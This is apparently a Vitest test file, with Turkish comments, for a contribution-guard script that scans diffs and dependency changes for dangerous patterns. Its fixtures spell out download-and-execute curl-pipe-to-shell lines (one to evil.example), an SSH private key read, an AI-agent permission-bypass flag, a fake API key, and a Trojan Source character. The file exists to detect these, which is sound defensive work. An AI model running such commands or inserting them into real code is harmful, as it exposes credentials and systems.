import { describe, expect, it } from 'vitest';
import { analyze, parseDiff, report } from '../../scripts/contribution-guard.mjs';

/** Örnekler parçalanarak kurulur: bu test dosyası koruyucuya takılmasın. */
const j = (...p: string[]) => p.join('');
const file = (path: string, ...lines: string[]) => ({
  path,
  added: lines.map((text, i) => ({ n: i + 1, text })),
  binary: false,
  deleted: false,
  isNew: false,
});
const codes = (r: ReturnType<typeof analyze>) => r.findings.map((f) => f.code).sort();

describe('katkı koruması (F29)', () => {
  it('diff ayrıştırma: eklenen satırlar ve satır numaraları, ikili dosya', () => {
    const diff = [
      'diff --git a/src/a.ts b/src/a.ts',
      '--- a/src/a.ts',
      '+++ b/src/a.ts',
      '@@ -10,0 +11,2 @@',
      '+const x = 1;',
      '+const y = 2;',
      'diff --git a/bin/x.exe b/bin/x.exe',
      'new file mode 100644',
      'Binary files /dev/null and b/bin/x.exe differ',
    ].join('\n');
    const files = parseDiff(diff);
    expect(files[0]).toMatchObject({
      path: 'src/a.ts',
      added: [{ n: 11 }, { n: 12, text: 'const y = 2;' }],
    });
    expect(files[1]).toMatchObject({ path: 'bin/x.exe', binary: true });
  });

  it('engelleyici kalıplar: eval, indir-çalıştır, kimlik bilgisi, bypass, telemetri, Trojan Source, gizli anahtar, gizlenmiş kod', () => {
    const r = analyze({
      files: [
        file(
          'src/x.ts',
          j('const f = ev', 'al(code);'),
          j('run("cur', 'l https://x.io/i.sh | sh");'),
          j('readFileSync(home + "/.ss', 'h/id_rsa");'),
          j('args.push("--dangerously-', 'skip-permissions");'),
          j('import ph from "post', 'hog-node";'),
          j('const ok = "a', '‮', 'b";'),
          j('const k = "sk-ant-', 'a'.repeat(30), '";'),
          j('const b = "', 'QUJD'.repeat(60), '";'),
        ),
        { ...file('dist/evil.exe'), binary: true },
      ],
    });
    expect(r.pass).toBe(false);
    expect(new Set(codes(r))).toEqual(
      new Set(['G07', 'G08', 'G09', 'G10', 'G11', 'G12', 'G13', 'G14', 'G16', 'G18']),
    );
    // güvenilir katkıcı da engelleyici bulguyu geçemez; yalnızca bakımcı onayı aşar
    expect(analyze({ files: [file('src/x.ts', j('ev', 'al(1)'))] }, { trusted: true }).pass).toBe(
      false,
    );
    expect(analyze({ files: [file('src/x.ts', j('ev', 'al(1)'))] }, { approved: true }).pass).toBe(
      true,
    );
  });

  it('review: güvenilir katkıcı geçer, dış katkıcı bakımcı onayı ister', () => {
    const files = [
      file('.github/workflows/ci.yml', 'run: npm test'),
      file('src/cli/update.ts', 'const x = 1;'),
      file('src/y.ts', 'fetch("https://new-endpoint.dev/api")'),
    ];
    const ext = analyze({ files });
    expect(codes(ext)).toEqual(['G05', 'G06', 'G08']);
    expect(ext.pass).toBe(false);
    expect(analyze({ files }, { trusted: true }).pass).toBe(true);
    expect(analyze({ files }, { approved: true }).pass).toBe(true);
    expect(report(ext)).toMatch(/guard-approved/);
  });

  it('bağımlılıklar: yeni paket review, kurulum betiği ve kayıt dışı kaynak block', () => {
    const r = analyze({
      files: [file('package.json', '"x": "1"')],
      pkg: {
        old: { dependencies: { a: '1.0.0' }, scripts: { build: 'tsc' } },
        new: {
          dependencies: { a: '1.0.0', b: '^2.0.0', c: 'github:kotu/paket', d: 'kotu/paket2' },
          scripts: { build: 'tsc', postinstall: 'node x.js' },
        },
      },
      lock: {
        old: { packages: {} },
        new: {
          packages: {
            '': {},
            'node_modules/b': {
              version: '2.0.0',
              resolved: 'https://registry.npmjs.org/b/-/b-2.0.0.tgz',
            },
            'node_modules/e': {
              version: '1.0.0',
              resolved: 'https://registry.npmjs.org/e/-/e-1.0.0.tgz',
              hasInstallScript: true,
            },
            'node_modules/f': { version: '1.0.0', resolved: 'https://kotu.example/f.tgz' },
          },
        },
      },
    });
    const c = codes(r);
    expect(c.filter((x) => x === 'G01')).toHaveLength(3);
    expect(c).toContain('G02');
    expect(c.filter((x) => x === 'G03').length).toBeGreaterThanOrEqual(3);
    expect(c).toContain('G04');
    expect(r.pass).toBe(false);
  });

  it('muafiyetler: dokümanlar, test fikstürleri, koruyucunun kendisi; temiz değişiklik geçer', () => {
    const r = analyze({
      files: [
        file('docs/x.md', j('cur', 'l https://get.example.org/i.sh | sh'), j('ev', 'al(1)')),
        file('test/fixtures/bad/SKILL.md', j('cur', 'l http://evil.example/x.sh | sh')),
        file('scripts/contribution-guard.mjs', j('ev', 'al(1)')),
        file('src/z.ts', 'export const sum = (a: number, b: number) => a + b;'),
      ],
    });
    expect(codes(r)).toEqual(['G06']);
    expect(analyze({ files: [file('src/z.ts', 'export const a = 1;')] }).pass).toBe(true);
  });
});
